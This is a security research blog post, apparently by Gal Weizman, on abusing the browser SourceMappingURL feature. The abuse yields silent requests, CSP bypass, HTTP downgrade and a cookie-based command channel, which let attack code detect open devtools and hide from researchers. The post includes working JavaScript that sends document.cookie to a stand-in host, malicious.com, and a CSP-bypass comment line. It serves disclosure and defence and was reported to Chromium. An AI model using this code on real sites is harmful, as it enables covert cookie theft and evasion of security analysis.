> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [weizman.github.io](https://weizman.github.io/?javascript-anti-debugging-some-next-level-shit-part-1)

> Originally was posted on Perimeterx (The company I was working for at the time this article was writt......

### 18/12/2019

_Originally was posted on [Perimeterx](https://www.perimeterx.com/blog/javascript-anti-debugging-1/) (The company I was working for at the time this article was written)_

_Later on was published on [Medium](https://medium.com/@weizmangal/javascript-anti-debugging-some-next-level-sh-t-part-1-abusing-sourcemappingurl-da91ff948e66)_

> **tl;dr - Abusing [SourceMappingURL](https://developer.mozilla.org/en-US/docs/Tools/Debugger/How_to/Use_a_source_map) feature can allow attackers to create one of the strongest Cross Browsers Javascript Anti Debugging techniques that was ever seen ([fully detailed live demo](https://us-central1-smap-251411.cloudfunctions.net/index))**

This article’s purpose is to introduce a new Javascript Anti Debugging technique in an advanced level and therefore assumes the reader already has an understanding of the different aspects of web security and what Javascript Anti Debugging really is.

Not too long ago, I’ve learned about [SourceMappingURL](https://developer.mozilla.org/en-US/docs/Tools/Debugger/How_to/Use_a_source_map) feature, which basically allows you to fetch a Source Map for your Javascript resources. It will map minified/uglified Javascript code to its original source code, thus will allow developers to easily debug their source code in the browser, instead of struggling with debugging the minified/uglified one - pretty cool feature! (and pretty old as well)

All you need to do is to locate the following comment at the bottom of your minified/uglified Javascript resource:

and the browser will fetch the map from your servers (which you’ll also need to implement yourself in order for the feature to actually work), and will make sure to do the mapping and the representation of it for you (if this doesn’t make a lot of sense to you - go read more about [SourceMappingURL](https://developer.mozilla.org/en-US/docs/Tools/Debugger/How_to/Use_a_source_map)!).

#### Two very important notes before we start:

SourceMappingURL feature is only activated when the devtools of the browser are open, since this is a development only feature and should not be a burden for the website while loading if the website is not being inspected!

Everything I am going to talk about here, is relevant to every major browser out there (was tested on Chrome, Safari, Firefox, Edge, Opera), However some might work in weaker forms. Please take into consideration that this feature did not exhibit 100% consistent behavior across browsers and versions, as achieving that was not a goal as part of this project - proof of concept was.

I was curious about its implementation and was wondering regarding its potential security issues, so I decided to have a look at it myself.

It had immediately drawn my attention when I realized its first interesting property:

### [The request to SourceMappingURL is completely silent and hidden](https://us-central1-smap-251411.cloudfunctions.net/caseSourceMap)

If a script contains the `SourceMappingURL=` comment and is attached to the DOM, the browser will fire a request to the link specified after the `=` sign - but you won’t be able to tell that by looking at the devtools - you won’t see anything in the network panel nor the console panel - simply nowhere! The only way of telling that request had happened is by either using some sort of a network debugging proxy (such as [fiddler](https://www.telerik.com/fiddler) or [wireshark](https://www.wireshark.org/)) or looking for that request in `chrome://net-export` in Chrome browser for example. The response to this request however cannot be captured by client side Javascript since it is being handled by the browser itself (because the browser is the one to get the source map and use it to map the bundled resources to the original resources).

Now that caught my attention! Being able to fire a hidden request from the browser! now that’s powerful. This is where I wondered about other properties this request might have that might be abused by attackers.

So firing a hidden request is awesome and everything, but it is just a static request. I mean, if I could dynamically construct the url to which the SourceMappingURL request should go, that would be even more powerful.

### [The SourceMappingURL can be constructed dynamically (on-the-fly)](https://us-central1-smap-251411.cloudfunctions.net/dynamic)

The following works:

```
function  smap(url, data)  {
    const script = document.createElement('script');
    script.textContent =  `//# SourceMappingURL=${url}?data=${JSON.stringify(data)}`;
    document.head.appendChild(script);
    script.remove();  
}

smap('https://malicious.com/reportStolenCookies',  {cookie: document.cookie});
```

And since this works, I can leak any type of dynamic information I want from the browser at its current execution. I can steal cookies, report timestamp and generally collect any type of information I wish to report and simply add it to the SourceMappingURL in order to send it. This is some powerful stuff!

So far so good. But as I always do when I learn of a new trick to send requests from the browser - I tried to see if I can use this one to bypass [CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) rules.

### [The request made by SourceMappingURL bypasses CSP completely](https://us-central1-smap-251411.cloudfunctions.net/csp)

Wow! That one was a cool discovery in my research! So if I go on https://example.com for example and it responds with Content-Security-Policy: default-src https://example.com as one of its headers (which means requests under https://example.com are only allowed to be made to https://example.com), I would be able to bypass that rule completely by using the SourceMappingURL feature by doing:

`//# SourceMappingURL=http://malicious.com?THIS_REQUEST_WILL_MAKE_IT_TO_THE_SERVER`.

This is pretty cool considering how difficult and almost impossible it is to bypass CSP rules these days.

*   Later on I’ve found out that this specific property of SourceMappingURL feature was already discovered before me (for example [here](https://twitter.com/xsspayloads/status/792683058931625984?lang=en)) - don’t worry though, this gets more interesting!

### [The request made by SourceMappingURL can be made using `http:` even if the page is loaded via `https:`](https://us-central1-smap-251411.cloudfunctions.net/csp)

Another cool property of SourceMappingURL feature is the fact that it can send non-secure requests via `http:` even if the main page was loaded via a secure connection over `https:`, a narrative that cannot be accomplished otherwise in the browser, since SSL downgrade is forbidden and is considered to be a serious security flaw.

So by this point I found some really cool hacks that by combining them all together, one can leak sensitive information while bypassing website’s CSP rules without it being documented whatsoever in the devtools, thus making it super hard to tell this strange activity took place in the victim’s browser.

So far so good. And then I was wondering to myself, if SourceMappingURL fires a request, does it have any of the other standard properties that any common request has? We already know that the response cannot be processed by the client side Javascript - so how is it similar to other types of network APIs in the browser? And then I’ve found the property that changed the game completely:

And that is the most powerful property of this feature - even though we don’t get to process the response ourselves, the browser respects response headers for this request, including `Set-Cookie`! This means an attacker can have a full request-and-response mechanism, simply by having their server inject the response in the cookie header instead of the actual response!

```
function  smap  (  ...  )  {  ...  }  
    const i =  setInterval(  ()  =>  {
    var response =  getCookieValueByCookieName('SMAP_RESPONSES');
    if  (!response)  return;
    deleteCookieByCookieName('SMAP_RESPONSES');
    clearInterval(i);
    alert('server says that 1 + 2 is '  + response);
},  100  );

smap('http://malicious.com/sum',  {a:  1, b:  2});
```

### Wait, This sounds much more powerful than simply just a Javascript Anti Debugging Technique - why stop there?

So, as I said before, the SourceMappingURL request is only fired when:

*   The browser’s devtools were open before the website started loading
    
*   The browser’s devtools were opened after the website has started loading
    

And that takes a lot of this finding’s power since it means that everything I have found so far is only relevant when the devtools are open.

### HOWEVER…

Since SourceMappingURL feature

*   fires a request the second devtools are being opened
    
*   is completely silent about sending the request
    
*   bypasses CSP rules completely
    
*   respects headers and cookies
    

It can actually be used as a very strong Javascript Anti Debugging technique!

### [How?](https://us-central1-smap-251411.cloudfunctions.net/scenario) (in a couple of words…)

By using SourceMappingURL feature’s power, an attacker can make sure their code will inform their servers the second the browser has its devtools opened.

In the response, the attacker can mark that browser with a cookie that will identify that browser as a potential hazard for the hacker. With that mark, the attacker can choose to do whatever, probably to serve that browser with an innocent Javascript code instead of their malicious code until the marking cookie is expired.

Or instead, the attacker can respond with a cookie that will contain data that the malicious Javascript code relies on in order to determine its next steps (a variation of a [C&C Client-Server mechanism](https://www.trendmicro.com/vinfo/us/security/definition/command-and-control-server) if you will).

The server for example can respond with `Set-Cookie: SMAP_COMMAND=while(1){}` and the client side can execute any command given to it by the server.

Also, on top of that request, the attacker can also leak any type of information they wish to steal from the victim.

And on top of everything, it will be extremely hard for any researcher to find this malicious activity since the request leaves no trace of its occurrence (and even harder if the attacker actually decides to avoid malicious code execution on that specific browser once it was marked as a “devtools opener”).

### “I don’t quite understand… I need some live examples”

That’s fair! This concept is not super easy to grasp just by reading, it is definitely worth seeing it works on live. Lucky for you, I’ve created a [thorough technical demo](https://us-central1-smap-251411.cloudfunctions.net/scenario) that attempts to fully explain and demonstrate everything mentioned here (I hope this demo is still up and running as it is located on PerimeterX's servers and I don't have control over it).

You are encouraged to check it out and let me know what you think of it!

### “Wait, you said this was Part 1, Is there a Part 2?”

Oh, right! In the next article I will cover another interesting ability I’ve found that only exists in browsers that use [Chromium’s devtools](https://github.com/ChromeDevTools).

It is another cool trick that can assist hackers in better understanding the researchers actions when trying to uncover them, and also protect only very specific parts of their malicious code, thus making it even harder for researchers to catch them.

I will post the link here once it is done :)

### To sum up

As someone who has experienced the world of web security and hacking quite a lot in my military service, I can tell you that this trick right here will take the game to the next level if used correctly.

Revealing malicious activity in the browser is much harder for researchers when there are actions made by the attacker that take place in the browser without the researcher being able to tell that they even happened!

Correctly implementing this trick into an attacking exploit kit will significantly reduce the chances of being uncovered by researchers (maybe not so much though, now that this article is publicly published) by basically filtering those out of the way and only attacking the innocents.

This trick can of course be very helpful not only to attackers but to other entities as well (such as big companies who want to alter their code when it is being investigated by researchers for example).

This technique has been responsibly [disclosed](https://bugs.chromium.org/p/chromium/issues/detail?id=988267) to the [chromium project](https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html) more than 90 days before publishing this article.

#### Hope you guys enjoyed this! :)

This research was conducted and published by [Gal Weizman](http://github.com/weizman/).